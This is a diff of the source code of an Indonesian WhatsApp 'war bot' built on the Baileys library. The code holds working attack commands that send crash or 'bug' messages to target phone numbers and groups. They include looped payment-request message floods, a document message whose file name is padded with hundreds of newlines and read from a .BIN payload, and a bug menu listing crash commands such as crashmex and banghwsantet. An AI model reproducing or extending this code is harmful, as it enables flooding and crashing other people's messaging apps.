@@ -752,7 +752,6 @@ if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup
 num = q.split('|')[0]
 jumlah = q.split('|')[1]
 for (let i = 0; i < jumlah; i++) {
-
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./baseikal/image/hwmodsgans.jpg') }, { upload: haikal.waUploadToServer })
 var requestPaymentMessage = generateWAMessageFromContent(num, proto.Message.fromObject({
 "requestPaymentMessage": {
@@ -1008,23 +1007,23 @@ if (!q) return m.reply(`Penggunaan ${command} Nama\n\nContoh : ${command} haikal
 let teks = `${q}`
 {
  var message = {
-                document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
+document : fs.readFileSync("./baseikal/sound/ngeselin.BIN"),
 "fileName": `🔥 ${teks} ☠️\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${buttonkal}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
-                caption: ` ${teks}  ${buttonkal}`,
-                footer: ` ${teks} `,
-                mentions: "",
-                templateButtons: [{ urlButton: {displayText: 'COPY', url: 'www.xnxxhwmods.com'}}, { quickReplyButton: { displayText: 'CLICK BUTTON COPY',id: '⚔️'}},
-{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🗡️'}},
+caption: ` ${teks}  ${buttonkal}`,
+footer: ` ${teks} `,
+mentions: "",
+templateButtons: [{ urlButton: {displayText: `${teks}`, url: 'www.xnxxhwmods.com'}}, 
 { quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '⚔️'}},
+{ quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🗡️'}},
 { quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🛡️'}},
 { quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🔧'}},
 { quickReplyButton: { displayText: `CLICK BY  ${teks} `, id: '🪞'}}],
 				headerType: 6
-                }
-                haikal.sendMessage(m.chat, message, { quoted : m })
-                }
-                }
-                break
+}
+haikal.sendMessage(m.chat, message, { quoted : m })
+}
+}
+break
 
 case '⚔️': case '🗡️': case '🛡️': case '🪞': case '🔧': {
 if (!isCreator) return
@@ -4573,41 +4572,49 @@ haikal.sendContact(m.chat, global.owner, m)
 }
 break
 //=================================================//
-/*
-case 'owner': {
+case 'infobot': {
 if (isBan) throw sticBanLu(from)
 let buttons = [
 {buttonId: `bugmenu`, buttonText: {displayText: 'BUG MENU'}, type: 1},
 {buttonId: `creator`, buttonText: {displayText: 'OWNER'}, type: 1},
-{buttonId: `soundmenu`, buttonText: {displayText: 'SOUND MENU'}, type: 1}
+{buttonId: `menu`, buttonText: {displayText: 'MENU'}, type: 1}
 ]
 const buttonMessage = {
 video:fs.readFileSync("./baseikal/video/haikal.mp4"),
 gifPlayback:true,
 jpegThumbnail:log0,
-caption: `
-◎ Lib : Multi-Device
-◎ Terbit : *01-09-1999*
-◎ Owner : © °banghw°͢
+caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
-[ 🇲🇨 Ini adalah Bot Pribadi Tekan Link Di Bawah Untuk Bergabung ]`,
+[ 🇲🇨 Aku Adalah Bot War Dari Indonesia]
+
+° Owner  : 6281214281312
+° Version : 11
+° Baileys : 4.4.0
+° Respons  ${latensi.toFixed(4)}
+° Bot Aktif : ${runtime(process.uptime())}`,
 footer: haikal.user.name,
 buttons: buttons,
-headerType: 4
+headerType: 3
 }
 haikal.sendMessage(m.chat, buttonMessage, { quoted: m })
 }
-break*/
+break
 //=================================================//
 case 'menu': {
 if (isBan) throw sticBanLu(from)
-haikal.sendMessage(m.chat, { image: kalimage, caption: `
-◎ °banghw°͢
-◎ Lib : Multi-De𝐯ice
-◎ Version 10
+haikal.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
+
+[ 🇲🇨 Aku Adalah Bot War Dari Indonesia]
+
+° Owner  : 6281214281312
+° Version : 11
+° Baileys : 4.4.0
+° Respons  ${latensi.toFixed(4)}
+° Bot Aktif : ${runtime(process.uptime())}
  ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━⊱
 ┣❏ Bugmenu  ➥ 
+┣❏ Infobot  ➥ 
 ┗━━⊱
  ▰▱▰▱▰▱▰▱▰▱▰▱▰▱
 ┏━━⊱
@@ -4655,11 +4662,15 @@ break
 //=================================================//
 case 'bugmenu': {
 if (isBan) throw sticBanLu(from)
-haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} 👋 Selamat ${salam}
+haikal.sendMessage(m.chat, { image: kalimage, caption: `◎ © Hay Kak ${pushname} 👋 Selamat ${salam}
 
-◎ Owner : ${botname}
-◎ Lib : Multi-Device
-◎ Terbit : *01-09-1999*
+[ 🇲🇨 Aku Adalah Bot War Dari Indonesia]
+
+° Owner  : 6281214281312
+° Version : 11
+° Baileys : 4.4.0
+° Respons  ${latensi.toFixed(4)}
+° Bot Aktif : ${runtime(process.uptime())}
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ^BUG BOT VIP^
 ^BY : ${botname}^
@@ -4674,13 +4685,13 @@ haikal.sendMessage(m.chat, { image: kalimage, caption: `© Hay Kak ${pushname} �
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
 ┏━━⊱[ TARGET ]
 ┣❏🔥 628xxx|5|5
-┣❏ crashmex 628xxx|5|5
+┣❏crashmex 628xxx|5|5
 ┣❏banghwskuy 628xxx
 ┣❏banghwsantet 628xxx@s.whatsapp.net|10|10s
 ┣❏catalogpc 628xxx@s.whatsapp.net|10|10s
 ┗━━⊱[°banghw°]
 ▬▭▬▭▬▭▬▭▬▬▭▬▭▬
-𝐊etik > m.chat ( di group dulu )
+Ketik > m.chat ( di group dulu )
 ┏━━⊱[ GROUP ]
 ┣❏gasbanghw 112674448xxx
 ┣❏banghwsantetgc  1237891xxxx@g.us|10|10s
